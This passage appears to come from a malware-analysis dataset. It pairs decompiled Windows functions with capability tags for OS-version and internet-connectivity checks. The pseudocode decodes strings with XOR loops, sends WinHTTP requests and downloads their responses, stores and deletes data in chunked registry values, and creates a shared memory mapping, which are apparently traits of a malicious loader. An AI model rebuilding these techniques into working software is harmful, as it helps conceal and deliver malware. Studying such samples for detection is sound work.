0x35;\n    var_8h = 0x37733469;\n    var_4h = CONCAT31(var_4h._1_3_, 0x35);\n    uVar2 = (*pcVar8)(8, 0x3d);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_f8h = &var_2ch - iVar4;\n    do {\n        var_3ch = 5;\n        puVar1 = iVar6 + iVar4;\n        iVar5 = iVar6 % 5;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_8h + iVar5) ^ puVar1[var_f8h];\n    } while (iVar6 < 0x1e);\n    var_108h = iVar4;\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar4, lpdwNumberOfBytesAvailable, 0x50);\n    uVar2 = (*pcVar8)(0, lpdwNumberOfBytesAvailable);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    puVar3 = hRequest;\n    puVar7 = 0x1;\n    if (lpMultiByteStr == 0) goto code_r0x0040d1b9;\n    if (hRequest == NULL) {\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(hRequest);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, (iVar4 + 1) * 2);\n        lpdwNumberOfBytesAvailable = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        *lpdwNumberOfBytesAvailable = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, puVar3, 0xffffffff, lpdwNumberOfBytesAvailable, iVar4 + 1);\n        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    }\n    var_40h = 0x59734121;\n    var_3ch = 0x41666660;\n    var_8h = 0x59364166;\n    var_4h = CONCAT22(var_4h._2_2_, 0x6634);\n    uVar2 = (*pcVar8)(8, 0x11);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar4 = 0;\n    hRequest = &var_40h - iVar6;\n    do {\n        puVar1 = iVar4 + iVar6;\n        iVar5 = iVar4 % lpdwNumberOfBytesRead;\n        iVar4 = iVar4 + 1;\n        *puVar1 = *(&var_8h + iVar5) ^ puVar1[&var_40h - iVar6];\n    } while (iVar4 < 8);\n    var_f8h = iVar6;\n    puVar3 = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)\n                       (lpMultiByteStr, iVar6, lpdwNumberOfBytesAvailable, 0, 0, 0, 0x800140);\n    hRequest = puVar3;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpdwNumberOfBytesAvailable);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    iVar4 = var_108h;\n    if (puVar3 == NULL) {\ncode_r0x0040d193:\n        lpdwNumberOfBytesAvailable = 0x1;\n    }\n    else {\n        var_10ch = 0x3300;\n        var_110h = 8;\n        iVar5 = fcn.0040aa6a();\n        if (iVar5 != 0) {\n            var_4h = 0;\n            var_8h = &var_418h;\n            stack0xfffffff0 = 3;\n            (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar3, 0x26, &var_fh + 3, 0xc);\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar3, 0x1f, &var_10ch, 4);\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar3, 0x3f, &var_110h, 4);\n        if (arg_18h != 0) {\n            var_30h = 0x66085924;\n            var_2ch = 0x59117720;\n            _var_28h = 0x7774660c;\n            stack0xffffffd8 = 0x660b5956;\n            stack0xffffffdc = 0x59027737;\n            stack0xffffffe0 = 0x773d660c;\n            stack0xffffffe4 = 0x664c594b;\n            stack0xffffffe8 = 0x595b772a;\n            var_13h._3_1_ = 0x69;\n            var_fh._0_1_ = 0x66;\n            var_8h = 0x66695976;\n            var_4h = CONCAT22(var_4h._2_2_, 0x774e);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x45);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar6 = 0;\n            lpdwNumberOfBytesAvailable = &var_30h - iVar4;\n            do {\n                puVar1 = iVar6 + iVar4;\n                iVar5 = iVar6 % lpdwNumberOfBytesRead;\n                iVar6 = iVar6 + 1;\n                *puVar1 = *(&var_8h + iVar5) ^ *(lpdwNumberOfBytesAvailable + puVar1);\n            } while (iVar6 < 0x22);\n            (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar4, arg_18h);\n            uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpszHeaders, 0x10000000);\n            puVar3 = hRequest;\n            (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(hRequest, &lpszHeaders, uVar2);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            iVar4 = var_108h;\n            iVar6 = var_f8h;\n        }\n        iVar5 = (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)(puVar3, 0, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar5 == 0) || (iVar5 = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(puVar3, 0),  iVar5 == 0))\n        goto code_r0x0040d193;\n        lpdwBufferLength = 4;\n        var_f4h = 0;\n        var_f0h = 0;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(puVar3, 0x20000005, 0, &var_f4h, &lpdwBufferLength, 0);\n        if (*arg_10h == 0) {\n            *arg_10h = var_f4h;\n        }\n        lpdwBufferLength = 4;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(puVar3, 0x20000013, 0, &var_f0h, &lpdwBufferLength, 0);\n        if ((var_f0h == 0xce) || (var_f0h == 200)) {\n            if (var_44h[1] == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_f4h);\n                iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                *var_44h = 0;\n                var_44h[1] = iVar5;\n            }\n            arg_18h = var_44h[1];\n            lpdwNumberOfBytesRead = NULL;\n            do {\n                lpdwNumberOfBytesAvailable = NULL;\n                iVar5 = (*_sym.imp.WINHTTP.dll_WinHttpQueryDataAvailable)(puVar3, &lpdwNumberOfBytesAvailable);\n                if ((iVar5 == 0) ||\n                   (iVar5 = (*_sym.imp.WINHTTP.dll_WinHttpReadData)\n                                      (puVar3, *var_44h + arg_18h, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead), \n                   iVar5 == 0)) {\n                    lpdwNumberOfBytesAvailable = 0x4;\n                    goto code_r0x0040d196;\n                }\n                *var_44h = *var_44h + lpdwNumberOfBytesRead;\n                iVar5 = *var_44h;\n            } while (lpdwNumberOfBytesAvailable != NULL);\n            *arg_14h = iVar5;\n            if ((*arg_10h == 0) || (iVar5 == *arg_10h)) {\n                lpdwNumberOfBytesAvailable = NULL;\n            }\n            else {\n                lpdwNumberOfBytesAvailable = 0x6;\n            }\n        }\n        else {\n            lpdwNumberOfBytesAvailable = 0x3;\n        }\n    }\ncode_r0x0040d196:\n    if (puVar3 != NULL) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(puVar3);\n    }\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    puVar7 = lpdwNumberOfBytesAvailable;\ncode_r0x0040d1b9:\n    uVar2 = (*pcVar8)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    if (lpMultiByteStr != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(lpMultiByteStr);\n    }\n    return puVar7;\n}\n",
        "token_count": 4631
    },
    "0040d356": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040d356(int32_t *param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    code *pcVar9;\n    uint ARG_0;\n    uint lpValueName;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uchar *var_58h;\n    int32_t *var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uchar *var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uchar var_20h;\n    ushort var_1fh;\n    uchar var_1dh;\n    uint lpType;\n    int32_t lpcbData;\n    int32_t var_14h;\n    int32_t hKey;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    *param_1 = 0;\n    param_1[1] = 0;\n    var_54h = param_1;\n    lpType = param_2;\n    uVar2 = (*pcVar9)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        var_50h = iVar3;\n        fcn.0040d6b2();\n        var_64h = fcn.0040d659(0x20019);\n        if (var_64h != 0) {\n            var_4ch = 0;\n            var_44h = 0x43196e55;\n            puVar7 = &ARG_0;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_40h = 0x6e564d01;\n            puVar7 = &lpValueName;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_3ch = 0x4d164302;\n            var_38h = 0x431d6e7e;\n            var_34h = 0x6e504d0e;\n            var_30h = 0x4d4a4315;\n            var_2ch = 0x43706e53;\n            var_ch = 0x43706e37;\n            var_8h._0_2_ = 0x4d6f;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x39);\n            var_68h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            hKey = 6;\n            iVar3 = 0;\n            do {\n                puVar1 = iVar3 + var_68h;\n                iVar5 = iVar3 % 6;\n                iVar3 = iVar3 + 1;\n                *puVar1 = *(&var_ch + iVar5) ^ puVar1[&var_44h - var_68h];\n            } while (iVar3 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, var_68h, lpType);\n            var_28h = 0x62446175;\n            var_24h = 0x37445066;\n            var_1fh = 0x5039;\n            var_1dh = 0x61;\n            var_20h = 6;\n            var_ch = 0x62376150;\n            var_8h._0_2_ = CONCAT11(var_8h._1_1_, 0x39);\n            do {\n                pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                puVar7 = &var_70h;\n                for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                puVar7 = &lpValueName;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n                var_6ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar3 = var_4ch;\n                iVar5 = 0;\n                hKey = &var_28h - var_6ch;\n                do {\n                    var_14h = 5;\n                    puVar1 = iVar5 + var_6ch;\n                    iVar6 = iVar5 % 5;\n                    iVar5 = iVar5 + 1;\n                    *puVar1 = *(&var_ch + iVar6) ^ puVar1[&var_28h - var_6ch];\n                } while (iVar5 < 0xc);\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, var_6ch, &ARG_0, var_4ch);\n                var_1h._0_1_ = '\\0';\n                var_48h = NULL;\n                var_4ch = iVar3 + 1;\n                var_14h = 0;\n                hKey = fcn.0040d659(0x20019);\n                param_1 = var_54h;\n                if (hKey != 0) {\n                    lpType = 3;\n                    lpcbData = 0;\n                    iVar5 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, &lpValueName, 0, &lpType, 0, &lpcbData);\n                    iVar3 = 0;\n                    if (iVar5 == 0) {\n                        uVar2 = (*pcVar9)(8, lpcbData);\n                        var_58h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        if (var_58h == NULL) {\n                            puVar4 = NULL;\n                            iVar5 = 0;\n                        }\n                        else {\n                            iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                                              (hKey, &lpValueName, 0, &lpType, var_58h, &lpcbData);\n                            puVar4 = var_58h;\n                            iVar5 = lpcbData;\n                            if (iVar6 != 0) goto code_r0x0040d59d;\n                        }\n                        var_1h._0_1_ = '\\x01';\n                        iVar3 = iVar5;\n                        var_48h = puVar4;\n                        var_14h = iVar5;\n                    }\ncode_r0x0040d59d:\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n                    if (((var_1h != '\\0') && (var_48h != NULL)) && (iVar3 != 0)) {\n                        if (param_1[1] == 0) {\n                            uVar2 = (*pcVar9)(8, iVar3);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        }\n                        else {\n                            uVar2 = (*pcVar9)(0, param_1[1], *param_1 + iVar3);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar2);\n                        }\n                        param_1[1] = iVar3;\n                        puVar4 = var_48h;\n                        puVar8 = iVar3 + *param_1;\n                        for (iVar5 = var_14h; iVar5 != 0; iVar5 = iVar5 + -1) {\n                            *puVar8 = *puVar4;\n                            puVar4 = puVar4 + 1;\n                            puVar8 = puVar8 + 1;\n                        }\n                        *param_1 = *param_1 + var_14h;\n                        pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_48h);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    }\n                }\n                uVar2 = (*pcVar9)(0, var_6ch);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            } while (var_1h != '\\0');\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_64h);\n            uVar2 = (*pcVar9)(0, var_68h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            iVar3 = var_50h;\n        }\n        uVar2 = (*pcVar9)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = 1;\n    if ((*param_1 == 0) || (param_1[1] == 0)) {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 2225
    },
    "0040d820": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040d820(int32_t *param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint *puVar8;\n    uint ARG_0;\n    uint lpValueName;\n    uint32_t var_58h;\n    int32_t var_54h;\n    int32_t *var_50h;\n    uint32_t var_4ch;\n    int32_t hKey;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = var_24h & 0xffffff00;\n    var_50h = param_1;\n    var_ch = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    uVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if ((((uVar3 != 0) && (param_1 != NULL)) && (*param_1 != 0)) && (param_1[1] != 0)) {\n        var_58h = uVar3;\n        fcn.0040d6b2();\n        hKey = fcn.0040d659(0x20006);\n        if (hKey != 0) {\n            var_44h = *param_1;\n            var_40h = 0x43196e55;\n            var_3ch = 0x6e564d01;\n            var_38h = 0x4d164302;\n            var_34h = 0x431d6e7e;\n            var_30h = 0x6e504d0e;\n            var_2ch = 0x4d4a4315;\n            var_4ch = (((var_44h + 0x7cfffU) / 0x7d000) * 0x7d000) / 0x7d000;\n            puVar8 = &ARG_0;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            var_28h = 0x43706e53;\n            puVar8 = &lpValueName;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            var_8h = 0x43706e37;\n            var_4h._0_2_ = 0x4d6f;\n            uVar2 = (*pcVar7)(8, 0x39);\n            var_54h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            var_20h = 6;\n            iVar4 = 0;\n            do {\n                puVar1 = iVar4 + var_54h;\n                iVar5 = iVar4 % 6;\n                iVar4 = iVar4 + 1;\n                *puVar1 = *(&var_8h + iVar5) ^ puVar1[&var_40h - var_54h];\n            } while (iVar4 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, var_54h, var_ch);\n            var_ch = 0;\n            var_18h = 0x62446175;\n            var_14h = 0x37445066;\n            var_10h._0_1_ = 6;\n            var_10h._1_2_ = 0x5039;\n            var_10h._3_1_ = 0x61;\n            var_8h = 0x62376150;\n            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x39);\n            var_20h = 5;\n            pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            do {\n                uVar2 = (*pcVar7)(8, 0x19);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar5 = 0;\n                var_1ch = &var_18h - iVar4;\n                do {\n                    puVar1 = iVar5 + iVar4;\n                    iVar6 = iVar5 % var_20h;\n                    iVar5 = iVar5 + 1;\n                    *puVar1 = *(&var_8h + iVar6) ^ puVar1[&var_18h - iVar4];\n                } while (iVar5 < 0xc);\n                puVar8 = &lpValueName;\n                for (iVar5 = 0x40; iVar6 = var_ch,  iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_ch);\n                (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, &lpValueName);\n                pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                var_ch = iVar6 + 1;\n            } while (var_ch < 0x32);\n            var_1ch = 0;\n            if (0 < var_4ch) {\n                var_ch = 0;\n                var_18h = 0x62446175;\n                var_14h = 0x37445066;\n                var_10h._0_1_ = 6;\n                var_10h._1_2_ = 0x5039;\n                var_10h._3_1_ = 0x61;\n                var_8h = 0x62376150;\n                var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x39);\n                do {\n                    uVar2 = (*pcVar7)(8, 0x19);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar5 = 0;\n                    var_24h = &var_18h - iVar4;\n                    do {\n                        puVar1 = iVar5 + iVar4;\n                        iVar6 = iVar5 % var_20h;\n                        iVar5 = iVar5 + 1;\n                        *puVar1 = *(&var_8h + iVar6) ^ puVar1[&var_18h - iVar4];\n                    } while (iVar5 < 0xc);\n                    puVar8 = &lpValueName;\n                    for (iVar5 = 0x40; iVar6 = var_1ch,  iVar5 != 0; iVar5 = iVar5 + -1) {\n                        *puVar8 = 0;\n                        puVar8 = puVar8 + 1;\n                    }\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_1ch);\n                    iVar5 = 0x7d000;\n                    if (var_44h < 0x7d000) {\n                        iVar5 = var_44h;\n                    }\n                    iVar5 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)\n                                      (hKey, &lpValueName, 0, 3, var_50h[1] + var_ch, iVar5);\n                    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    var_24h = -iVar5 & 0xffffff00U | 1 - (iVar5 != 0);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    var_1ch = iVar6 + 1;\n                    var_ch = var_ch + 0x7d000;\n                    var_44h = var_44h + -0x7d000;\n                } while (var_1ch < var_4ch);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar2 = (*pcVar7)(0, var_54h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar3 = var_58h;\n        }\n        uVar2 = (*pcVar7)(0, uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    return uVar3 & 0xffffff00 | var_24h & 0xff;\n}\n",
        "token_count": 2145
    },
    "0040db44": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040db44(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint psz2;\n    uint var_4h;\n    \n    psz2 = *0x41cad8;\n    if (*0x41cda8 != 0) {\n        return 1;\n    }\n    var_40h = 0x53215039;\n    var_3ch = 0x500a6609;\n    var_38h = 0x661f533e;\n    var_34h = 0x53335000;\n    var_30h = 0x502b661e;\n    var_2ch = 0x661b5301;\n    var_28h = 0x5320502f;\n    var_24h = 0x502a6616;\n    var_20h = 0x66165301;\n    var_1ch = 0x5326502d;\n    var_18h = 0x5021661a;\n    var_14h = 0x6673533c;\n    var_10h = 0x5352504e;\n    var_ch._0_2_ = 0x6673;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    do {\n        var_4h = 6;\n        puVar1 = iVar6 + iVar4;\n        iVar5 = iVar6 % 6;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_10h + iVar5) ^ puVar1[&var_40h - iVar4];\n    } while (iVar6 < 0x30);\n    *0x41cda8 = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(0xffffffff, 0, 4, 0, 0x208, iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41cda8 != 0) {\n        if ((*0x41cda4 != 0) ||\n           (*0x41cda4 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(*0x41cda8, 0xf001f, 0, 0, 0x208),  *0x41cda4 != 0)) {\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(*0x41cda4, psz2);\n            uVar3 = (*pcVar2)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x41cda8);\n        *0x41cda8 = 0;\n    }\n    uVar3 = (*pcVar2)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return 0;\n}\n",
        "token_count": 815
    },
    "0040f276": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040f276(int32_t param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_14h = param_1;\n    if (*0x41cdac == NULL) {\n        var_2ch = 0x17321201;\n        var_28h = 0x317c5303;\n        var_24h = 0x171717;\n        var_20h._0_2_ = 0x123b;\n        var_20h._2_1_ = 0x65;\n        var_1ch = 0x78656148;\n        var_18h._0_2_ = 0x6574;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        var_8h = 6;\n        iVar8 = 0;\n        do {\n            puVar1 = iVar8 + var_10h;\n            iVar5 = iVar8 % 6;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_1ch + iVar5) ^ puVar1[&var_2ch - var_10h];\n        } while (iVar8 < 0xf);\n        var_2ch = 0xb452c32;\n        var_28h = 0x7b6a1413;\n        var_24h = 0x141a0119;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x59);\n        var_1ch = 0x65374959;\n        var_18h._0_2_ = 0x7876;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        iVar8 = var_10h;\n        iVar7 = 0;\n        do {\n            puVar1 = iVar7 + iVar5;\n            iVar6 = iVar7 % var_8h;\n            iVar7 = iVar7 + 1;\n            *puVar1 = *(&var_1ch + iVar6) ^ puVar1[&var_2ch - iVar5];\n        } while (iVar7 < 0xd);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5, var_10h);\n        *0x41cdac = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n        pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        uVar4 = (*pcVar3)(0, iVar8);\n        (*pcVar2)(uVar4);\n        if (*0x41cdac == NULL) {\n            return var_4h;\n        }\n    }\n    if ((var_14h != 0) && (iVar8 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, var_14h),  iVar8 != 0)) {\n        iVar5 = (**0x41cdac)(iVar8, &var_4h);\n        var_4h = var_4h & -(iVar5 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar8);\n    }\n    return var_4h;\n}\n",
        "token_count": 955
    },
    "0040f4d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040f4d5(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t in_EDX;\n    uint uVar6;\n    char *pcVar7;\n    uint32_t *puVar8;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    fcn.0040f276();\n    fcn.0040ed7c(0, &var_4h);\n    var_8h = var_4h;\n    puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n    if (puVar3 != NULL) {\n        do {\n            iVar4 = fcn.0040ed7c(var_8h, &var_4h);\n            uVar1 = var_4h;\n            if ((iVar4 != 0) || (var_4h <= var_8h)) break;\n            var_8h = var_4h;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n            puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar1, 0x3000, 4);\n        } while (puVar3 != NULL);\n        uVar6 = 2;\n        if ((puVar3 != NULL) && (uVar1 <= var_8h)) {\n            var_8h = 0;\n            